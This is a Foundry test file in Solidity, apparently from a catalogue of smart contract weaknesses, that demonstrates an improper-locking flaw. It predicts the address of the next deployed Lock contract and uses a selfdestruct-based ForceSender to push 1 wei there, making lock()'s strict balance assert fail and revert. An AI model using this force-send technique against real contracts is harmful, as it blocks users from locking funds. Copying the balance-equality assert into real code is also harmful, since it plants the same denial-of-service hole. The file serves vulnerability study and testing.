pragma solidity ^0.8.0;
// SPDX-License-Identifier: UNLICENSED

import "forge-std/Test.sol";
import "../src/6.1.3-Improper-Locking-vulnerability.sol";


contract ImproperLockingTest is Test {
    LockContract lockContract;
    ForceSender forceSender;

    // Set up the test environment
    function setUp() public {
        lockContract = new LockContract();
        forceSender = new ForceSender();
    }

    // Computes the address where the next Lock contract will be deployed from lockContract
    // using the standard CREATE formula:
    // address = keccak256( 0xd6, 0x94, deployer, nonce )
    function computeNextContractAddress(address creator) public view returns (address) {
        // Get the current nonce of the creator. For a contract deploying its first contract, nonce is expected to be 1.
        uint256 nonce = vm.getNonce(creator);
        // RLP encode. Since nonce is small (< 128), it is encoded as a single byte.
        return address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xd6),
            bytes1(0x94),
            creator,
            uint8(nonce)
        )))));
    }

    // A control test: calling lock normally with a provided ETH value should work.
    function testLockNoAttack() public {
        // dummy data provided for edgewareAddr
        bytes memory dummyAddr = "dummy";
        uint256 term = 60; // arbitrary term
        // Call lock with 1 ether; no forced ETH, so the assert in lock() will pass
        lockContract.lock{value: 1 ether}(term, dummyAddr, true);
    }

    // Test that demonstrates the vulnerability: an attacker can force additional ETH into the Lock contract
    // by using selfdestruct, causing the assert in lock() to fail.
    function testLockWithForcedFunds() public {
        // Compute the address where the Lock contract will be deployed next
        address predictedLockAddress = computeNextContractAddress(address(lockContract));

        // Simulate an attacker that force-sends additional ETH (via selfdestruct) to the predicted Lock contract address
        address attacker = address(0xABCD);
        vm.deal(attacker, 2 ether);
        vm.prank(attacker);
        // ForceSender.attack will deploy a temporary contract and selfdestruct, sending 1 wei to the target
        forceSender.attack{value: 1 wei}(payable(predictedLockAddress));

        // Now, when lock() is called, the new Lock contract will be deployed with 1 ether from msg.value
        // but it will already have an extra 1 wei forced into it, meaning its balance becomes 1 ether + 1 wei.
        // The assert(address(lockAddr).balance == msg.value) in lock() will fail, triggering a Panic error.
        bytes memory dummyAddr = "dummy";
        uint256 term = 60;

        // Expect a revert with a Panic error (assert triggers a Panic(uint256))
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", uint256(0x1)));
        lockContract.lock{value: 1 ether}(term, dummyAddr, true);
    }
}
